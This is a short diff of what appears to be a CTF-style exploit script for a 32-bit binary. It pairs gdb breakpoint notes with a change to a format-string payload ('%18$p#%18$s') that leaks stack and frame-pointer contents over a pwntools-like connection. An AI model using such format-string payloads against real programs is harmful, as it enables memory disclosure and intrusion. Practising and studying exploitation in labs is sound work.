@@ -12,7 +12,7 @@ b *0x08048774  分配栈空间
 b read + 5
 b *0x08048646  printf
 
-n = (x // 4)
+%18$p#%18$s  # 读取ebp，和下一个ebp的地址
 
 """
 
@@ -44,10 +44,8 @@ def print_payload():
 
 def main():
     # stack_paddings = {32: 1024, 48: 1024, 64: 1024, 4128: 1024, 4144: 1024, 4160: 1024, 8224: 1024, 8240: 1024, 8256: 1024, 16: 512, 80: 512, 4112: 512, 4176: 512, 8208: 512, 8272: 512, 12320: 16, 12336: 16, 12352: 16, 12304: 8, 12368: 2}
-    stack_paddings = {32: 1024, 48: 1024, 64: 1024}
-
-    n_list = [k for k in stack_paddings.keys()]
-    payload = "#".join(["%{}$p".format(n // 4 + 19) for n in n_list])
+    # stack_paddings = {32: 1024, 48: 1024, 64: 1024}
+    payload = "%18$p#%18$s$$$$$$$$"
 
     io.send(payload)
     io.interactive()
